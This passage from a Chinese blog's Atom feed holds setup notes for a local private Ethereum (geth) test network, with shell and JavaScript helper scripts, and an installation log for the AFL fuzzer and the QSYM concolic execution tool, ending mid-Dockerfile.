class="built_in">cat</span> password.txt | <span class="built_in">head</span> -n 1 | <span class="built_in">tee</span> node2/password.txt</span><br><span class="line"></span><br><span class="line">bootnode -genkey boot.key</span><br><span class="line">bootnode -nodekey boot.key -addr :30305</span><br></pre></td></tr></table></figure><h3 id="两个输入文件的内容"><a href="#两个输入文件的内容" class="headerlink" title="两个输入文件的内容"></a>两个输入文件的内容</h3><figure class="highlight plaintext"><figcaption><span>password.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1234567890</span><br><span class="line">1234567890</span><br></pre></td></tr></table></figure><blockquote><p>这里两个节点的密码是相同的，也可以单独为每个节点写一个密码文件，但是密码文件必须两行相同，因为创建账户时需要输入两次密码</p></blockquote><figure class="highlight plaintext"><figcaption><span>puppeth.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tianer</span><br><span class="line">2</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line">yes</span><br><span class="line">12345</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure><blockquote><p>从上到下依次对配置创世块的配置文件进行创建，导出保存，删除。<br>会使用sed命令在第五行临时插入刚刚生成的账户文件的区块链地址，这样<code>puppeth</code>命令就知道要给哪些地址分配初始的以太币</p></blockquote><h3 id="sed命令"><a href="#sed命令" class="headerlink" title="sed命令"></a>sed命令</h3><p>sed 命令是一个面向行处理的工具，它以“行”为处理单位，针对每一行进行处理，处理后的结果会输出到标准输出（STDOUT）。你会发现 sed 命令是很懂礼貌的一个命令，它不会对读取的文件做任何贸然的修改，而是将内容都输出到标准输出中。</p><ul><li><p>基本用法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed [选项] <span class="string">&quot;指令&quot;</span> 文件</span><br></pre></td></tr></table></figure></li><li><p>选项，如果希望sed命令对文件直接进行更改，需要添加<code>-i</code>参数， 以下是几个查那个用的参数</p><ul><li><code>-e</code> 　　–它告诉sed将下一个参数解释为一个sed指令，只有当命令行上给出多个sed指令时使用</li><li><code>-f</code> 　　–后跟保存了sed指令的文件</li><li><code>-i</code> 　　–直接对内容进行修改，不加 i 时默认只是预览，不会对文件进行实际修改</li><li><code>-n</code> 　　–取消默认输出，sed默认会输出所有文本内容，使用 -n 参数后只显示处理过的行</li></ul></li><li><p>指令，类似vim，sed也有编辑命令</p><ul><li><code>a</code> 　　  –追加，向匹配行后插入内容</li><li><code>c</code> 　    –更改，更改匹配行的内容</li><li><code>i</code> 　    –插入，向匹配行前插入内容</li><li><code>d</code>   　　–删除，删除匹配的内容</li><li><code>s</code>   　　–替换，替换匹配到的内容</li><li><code>p</code> 　    –打印，打印匹配到的内容，通常与 -n 和用</li><li><code>=</code> 　　  –用来打印被匹配到的行的行号</li><li><code>n</code>　　   –读取下一行，遇到n时会自动跳入下一行</li><li><code>r,w</code> 　　–读和写，r用于将内容读入文件，w用于将匹配内容写入到文件</li></ul></li></ul><blockquote><p>其中<code>s</code>命令后跟正则串和目标串，可以起到文本的匹配替换<br><code>sed</code>的指令使用<code>/</code>作为定界符，转义符为<code>\</code></p></blockquote><p>例子：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/book/books/&#x27;</span> file</span><br><span class="line">sed -i <span class="string">&#x27;s/book/books/g&#x27;</span> file <span class="comment"># 后缀g对每行的所有匹配进行替换</span></span><br><span class="line">sed -i <span class="string">&#x27;2d&#x27;</span> file <span class="comment">#删除指定行</span></span><br><span class="line">sed -i <span class="string">&#x27;5ixxxxx&#x27;</span> file <span class="comment">#在指定行插入xxxxx</span></span><br></pre></td></tr></table></figure><ul><li>具体可以参考<a href="https://blog.csdn.net/L1259863243/article/details/79364094">这里</a></li></ul><h3 id="awk命令"><a href="#awk命令" class="headerlink" title="awk命令"></a>awk命令</h3><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。<br>之所以叫 AWK 是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的 Family Name 的首字符<br>linux中有三剑客之称：<br>三剑客之首就是 AWK<br>三剑客功能:<br>grep ： 过滤文本<br>sed  :  修改文本<br>awk  :  处理文本</p><ul><li>语法格式</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk [参数] [处理内容] [操作对象]</span><br></pre></td></tr></table></figure><ul><li>具体可以参考<a href="http://c.biancheng.net/view/4082.html">这里</a></li></ul><h2 id="mine-sh"><a href="#mine-sh" class="headerlink" title="mine.sh"></a>mine.sh</h2><p>用于启动创建的两个节点</p><figure class="highlight sh"><figcaption><span>mine.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NODE=<span class="variable">$2</span></span><br><span class="line">ENODE=<span class="variable">$1</span></span><br><span class="line">AUTHRPCPORT=$((<span class="variable">$2</span>+<span class="number">8554</span>))</span><br><span class="line">PORT=$((<span class="variable">$2</span>+<span class="number">30308</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> geth --datadir node<span class="variable">$NODE</span> --port <span class="variable">$PORT</span> --bootnodes <span class="variable">$ENODE</span> --networkid 12345 --unlock 0x$(<span class="built_in">cat</span> node<span class="variable">$NODE</span>/keystore/UTC--* | awk <span class="string">&#x27;&#123;split($0, arr, &quot;\&quot;&quot;); print arr[4]&#125;&#x27;</span>) --password node1/password.txt --authrpc.port <span class="variable">$AUTHRPCPORT</span></span><br><span class="line"></span><br><span class="line">geth --datadir node<span class="variable">$NODE</span> --port <span class="variable">$PORT</span> --bootnodes <span class="variable">$ENODE</span> --networkid 12345 --unlock 0x$(<span class="built_in">cat</span> node<span class="variable">$NODE</span>/keystore/UTC--* | awk <span class="string">&#x27;&#123;split($0, arr, &quot;\&quot;&quot;); print arr[4]&#125;&#x27;</span>) --password node1/password.txt --authrpc.port <span class="variable">$AUTHRPCPORT</span> --mine</span><br></pre></td></tr></table></figure><blockquote><p>前一个脚本执行后，会输出enode， 将其复制下来，打开两个新的terminal窗口，enode作为这个脚本的第一个参数，第二个参数是希望启动的节点的编号</p></blockquote><h2 id="attach-sh"><a href="#attach-sh" class="headerlink" title="attach.sh"></a>attach.sh</h2><p>用于让两个节点开始挖矿，使用<code>geth attach</code>打开js交互界面，<code>miner.txt</code>作为输入文件，执行命令<code>miner.start(1)</code>开始挖矿</p><figure class="highlight sh"><figcaption><span>attach.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NODE=<span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> geth attach node<span class="variable">$NODE</span>/geth.ipc</span><br><span class="line">geth attach node<span class="variable">$NODE</span>/geth.ipc  &lt; miner.txt</span><br></pre></td></tr></table></figure><blockquote><p>参数为希望开始挖矿的节点编号，也需要打开新的terminal执行</p></blockquote><figure class="highlight js"><figcaption><span>miner.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.<span class="property">peerCount</span></span><br><span class="line">eth.<span class="title function_">getBalance</span>(eth.<span class="property">accounts</span>[<span class="number">0</span>])</span><br><span class="line">miner.<span class="title function_">start</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="sk-js"><a href="#sk-js" class="headerlink" title="sk.js"></a>sk.js</h2><p>用于获取节点的私钥，在开发时私钥很重要</p><figure class="highlight js"><figcaption><span>sk.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> keythereum = <span class="built_in">require</span>(<span class="string">&quot;keythereum&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> datadir = <span class="string">&quot;/home/tt/eth/net/node2/&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> address= <span class="string">&quot;e43b98ac32beb344c94b15b9af5b46674d6c3e6d&quot;</span>;<span class="comment">//要小写</span></span><br><span class="line"><span class="keyword">const</span> password = <span class="string">&quot;1234567890&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> keyObject = keythereum.<span class="title function_">importFromFile</span>(address, datadir);</span><br><span class="line"><span class="keyword">var</span> privateKey = keythereum.<span class="title function_">recover</span>(password, keyObject);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(privateKey.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br></pre></td></tr></table></figure><blockquote><p>需要节点的<code>datadir</code>和节点的<code>address</code></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;主要工作&quot;&gt;&lt;a href=&quot;#主要工作&quot; class=&quot;headerlink&quot; title=&quot;主要工作&quot;&gt;&lt;/a&gt;主要工作&lt;/h2&gt;&lt;p&gt;参考&lt;code&gt;go-ethereum&lt;/code&gt;官网的&lt;a href=&quot;https://geth.ethereum.org/docs/fundamentals/private-network&quot;&gt;Private Networks&lt;/a&gt;文档搭建了一个私有链，并总结出几个脚本，可以半自动化地实现geth网络的搭建，脚本已上传至github仓库&lt;a href=&quot;https://github.com/jingtianer/DLCCB&quot;&gt;DLCCB&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;setup-sh&quot;&gt;&lt;a href=&quot;#setup-sh&quot; class=&quot;headerlink&quot; title=&quot;setup.sh&quot;&gt;&lt;/a&gt;setup.sh&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这一步使用了以下几个工具&lt;ul&gt;
&lt;li&gt;&lt;code&gt;geth&lt;/code&gt;命令，用于生成初始两个节点的账户，使用创世块配置文件对两个账户进行初始化&lt;/li&gt;
&lt;li&gt;&lt;code&gt;puppeth&lt;/code&gt; 用于生成创世块的配置文件，这个命令是交互式的，编写了一个&lt;code&gt;puppeth.txt&lt;/code&gt;作为其输入，默认生成一个基于pow的区块链&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bootnode&lt;/code&gt; 用于生成启动bootnode&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;这一步使用了以下几个linux命令&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sed&lt;/code&gt; 非交互式的文本编辑器，用于读取生成的账户的区块链地址，写入&lt;code&gt;puppeth.txt&lt;/code&gt;中，使得&lt;code&gt;puppeth&lt;/code&gt;工具能为初始的两个节点分配一定的以太币&lt;/li&gt;
&lt;li&gt;&lt;code&gt;awk&lt;/code&gt;，用于对文本的处理&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;figcaption&gt;&lt;span&gt;setup.sh&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;mkdir&lt;/span&gt; node1 node2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth --datadir node1 account new &amp;lt; password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth --datadir node2 account new &amp;lt; password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5i&lt;span class=&quot;subst&quot;&gt;$(cat node1/keystore/UTC--* | awk &amp;#x27;&amp;#123;split($0, arr, &lt;span class=&quot;string&quot;&gt;&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;; print arr[4]&amp;#125;&amp;#x27;)&amp;quot;&lt;/span&gt; puppeth.txt &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5i&lt;span class=&quot;subst&quot;&gt;$(cat node2/keystore/UTC--* | awk &amp;#x27;&amp;#123;split($0, arr, &lt;span class=&quot;string&quot;&gt;&amp;quot;\&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;; print arr[4]&amp;#125;&amp;#x27;)&amp;quot;&lt;/span&gt; puppeth.txt &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;puppeth &amp;lt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5d&amp;quot;&lt;/span&gt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -i &lt;span class=&quot;string&quot;&gt;&amp;quot;5d&amp;quot;&lt;/span&gt; puppeth.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth init --datadir node1 tianer.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;geth init --datadir node2 tianer.json&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cat&lt;/span&gt; password.txt | &lt;span class=&quot;built_in&quot;&gt;head&lt;/span&gt; -n 1 | &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; node1/password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cat&lt;/span&gt; password.txt | &lt;span class=&quot;built_in&quot;&gt;head&lt;/span&gt; -n 1 | &lt;span class=&quot;built_in&quot;&gt;tee&lt;/span&gt; node2/password.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootnode -genkey boot.key&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bootnode -nodekey boot.key -addr :30305&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;两个输入文件的内容&quot;&gt;&lt;a href=&quot;#两个输入文件的内容&quot; class=&quot;headerlink&quot; title=&quot;两个输入文件的内容&quot;&gt;&lt;/a&gt;两个输入文件的内容&lt;/h3&gt;</summary>
    
    
    
    <category term="misc" scheme="https://jingtianer.github.io/home/categories/misc/"/>
    
    
    <category term="linux" scheme="https://jingtianer.github.io/home/tags/linux/"/>
    
    <category term="geth" scheme="https://jingtianer.github.io/home/tags/geth/"/>
    
    <category term="blockchain" scheme="https://jingtianer.github.io/home/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>QSYM-afl-环境安装</title>
    <link href="https://jingtianer.github.io/home/2023/01/07/%E7%BB%84%E4%BC%9A/QSYM-afl-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
    <id>https://jingtianer.github.io/home/2023/01/07/%E7%BB%84%E4%BC%9A/QSYM-afl-%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</id>
    <published>2023-01-07T04:15:37.000Z</published>
    <updated>2023-02-12T03:09:54.388Z</updated>
    
    <content type="html"><![CDATA[<h2 id="afl的安装"><a href="#afl的安装" class="headerlink" title="afl的安装"></a>afl的安装</h2><ul><li>安装<code>build-essentials</code>和<code>cmake</code></li><li>github下载源码并解压</li><li><code>make</code></li><li><code>make install</code></li></ul><p><code>usr/local/bin</code>下有了编译好的afl工具</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@tt-HP:~/dns_env<span class="comment"># find /usr/local/bin/afl*</span></span><br><span class="line">/usr/local/bin/afl-analyze</span><br><span class="line">/usr/local/bin/afl-clang</span><br><span class="line">/usr/local/bin/afl-clang++</span><br><span class="line">/usr/local/bin/afl-cmin</span><br><span class="line">/usr/local/bin/afl-fuzz</span><br><span class="line">/usr/local/bin/afl-g++</span><br><span class="line">/usr/local/bin/afl-gcc</span><br><span class="line">/usr/local/bin/afl-gotcpu</span><br><span class="line">/usr/local/bin/afl-plot</span><br><span class="line">/usr/local/bin/afl-showmap</span><br><span class="line">/usr/local/bin/afl-tmin</span><br><span class="line">/usr/local/bin/afl-whatsup</span><br></pre></td></tr></table></figure><h2 id="qsym的安装"><a href="#qsym的安装" class="headerlink" title="qsym的安装"></a>qsym的安装</h2><ul><li>以下是安装方法<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disable ptrace_scope for PIN</span></span><br><span class="line">$ <span class="built_in">echo</span> 0|sudo <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"></span><br><span class="line"><span class="comment"># install z3 and system deps</span></span><br><span class="line">$ ./setup.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># install using virtual env</span></span><br><span class="line">$ virtualenv venv</span><br><span class="line">$ <span class="built_in">source</span> venv/bin/activate</span><br><span class="line">$ pip install .</span><br></pre></td></tr></table></figure><blockquote><p>不用wsl用vm就不会有很多问题</p></blockquote></li></ul><h3 id="ptrace置0"><a href="#ptrace置0" class="headerlink" title="ptrace置0"></a>ptrace置0</h3><p>可能是由于内核版本问题，<code>/proc/sys/kernel/yama/ptrace_scope</code>文件不存在，查到可以修改另一个文件 <code>/etc/sysctl.d/10-ptrace.conf</code>，添加或修改以下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kernel.yama.ptrace_scope = 0</span><br></pre></td></tr></table></figure><p>在<code>setup.sh</code>中会对这个<code>/proc/sys/kernel/yama/ptrace_scope</code>文件中的值是否为0进行判断，由于我没有，将脚本中这几行删掉</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! grep -qF <span class="string">&quot;0&quot;</span> /proc/sys/kernel/yama/ptrace_scope; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Please run &#x27;echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><h3 id="子模块下载问题"><a href="#子模块下载问题" class="headerlink" title="子模块下载问题"></a>子模块下载问题</h3><p>安装过程中发现<code>git submodule</code>下载不下来，使用递归的方式重新clone</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/sslab-gatech/qsym.git --recursive</span><br></pre></td></tr></table></figure><p>在<code>setup.sh</code>把git submodule 去掉</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br></pre></td></tr></table></figure><h3 id="配置PYTHON环境变量"><a href="#配置PYTHON环境变量" class="headerlink" title="配置PYTHON环境变量"></a>配置PYTHON环境变量</h3><p>观察到setup.sh中，get-pip时需要使用python2环境，提示需要<code>PYTHON环境变量</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">export</span> PYTHON=$(<span class="built_in">echo</span> $(whereis python2) | awk <span class="string">&#x27;&#123;split($0, arr, &quot; &quot;); print arr[2]&#125;&#x27;</span>) | <span class="built_in">tee</span> -a ~/.bashrc </span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><h3 id="找不到bits-h"><a href="#找不到bits-h" class="headerlink" title="找不到bits/*.h"></a>找不到<code>bits/*.h</code></h3><ul><li>安装multilib<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ubuntu-toolchain-r/test</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y g++-multilib</span><br></pre></td></tr></table></figure></li></ul><h3 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install virtualenv</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">pip install virtualenv</span><br></pre></td></tr></table></figure><h3 id="安装lsb"><a href="#安装lsb" class="headerlink" title="安装lsb"></a>安装lsb</h3><ul><li>进行<code>pip install .</code>时可能报错<code>make: lsb_release: Command not found</code>，安装lsb既可</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lsb-core</span><br></pre></td></tr></table></figure><blockquote><p>最终在vm的ubuntu 16.04下成功进行了安装，python环境是python3.7.9（ubuntu 16.04需要下载python3.7源码编译安装）（python2环境也成功了，其实不应该安装python3，整个项目都应该运行在python2环境下）</p></blockquote><h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tests</span><br><span class="line">python build.py</span><br><span class="line">python -m pytest -n $(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure><ul><li><p>requirements</p><ul><li><code>pip install python-afl</code></li></ul></li><li><p>运行结果</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(venv) tt@ubuntu:~/Desktop/dns/qsym/tests$ python -m pytest -n $(<span class="built_in">nproc</span>)</span><br><span class="line">============================= <span class="built_in">test</span> session starts ==============================</span><br><span class="line">platform linux2 -- Python 2.7.12, pytest-4.6.11, py-1.11.0, pluggy-0.13.1</span><br><span class="line">rootdir: /home/tt/Desktop/dns/qsym</span><br><span class="line">plugins: forked-1.3.0, xdist-1.34.0</span><br><span class="line">gw0 [250] / gw1 [250] / gw2 [250] / gw3 [250]</span><br><span class="line">........................................................................ [ 28%]</span><br><span class="line">........................................................................ [ 57%]</span><br><span class="line">........................................................................ [ 86%]</span><br><span class="line">..................................                                                                                                                                                                   [100%]</span><br><span class="line">======================================================================================= 250 passed <span class="keyword">in</span> 565.71 seconds =======================================================================================</span><br></pre></td></tr></table></figure></li></ul><h2 id="使用docker安装qsym"><a href="#使用docker安装qsym" class="headerlink" title="使用docker安装qsym"></a>使用docker安装qsym</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># disable ptrace_scope for PIN</span></span><br><span class="line">$ <span class="built_in">echo</span> 0|sudo <span class="built_in">tee</span> /proc/sys/kernel/yama/ptrace_scope</span><br><span class="line"></span><br><span class="line"><span class="comment"># build docker image</span></span><br><span class="line">$ docker build -t qsym ./</span><br><span class="line"></span><br><span class="line"><span class="comment"># run docker image</span></span><br><span class="line">$ docker run --cap-add=SYS_PTRACE -it qsym /bin/bash</span><br></pre></td></tr></table></figure><h3 id="错误1"><a href="#错误1" class="headerlink" title="错误1"></a>错误1</h3><ul><li>ERROR [internal] load metadata for docker.io&#x2F;library&#x2F;ubuntu:16.04</li></ul><p>在docker中的<code>daemon.json</code>中修改buildkit为false</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;features&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;buildkit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span> <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="ptrace置0-1"><a href="#ptrace置0-1" class="headerlink" title="ptrace置0"></a>ptrace置0</h3><ul><li>使用docker时，build时的ubuntu镜像也没有这个<code>/proc/sys/kernel/yama/ptrace_scope</code>文件。setup.sh中将脚本中这几行删掉<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ! grep -qF <span class="string">&quot;0&quot;</span> /proc/sys/kernel/yama/ptrace_scope; <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;Please run &#x27;echo 0|sudo tee /proc/sys/kernel/yama/ptrace_scope&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">exit</span> -1</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="最终的dockerfile"><a href="#最终的dockerfile" class="headerlink" title="最终的dockerfile"></a>最终的dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">16.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> deb 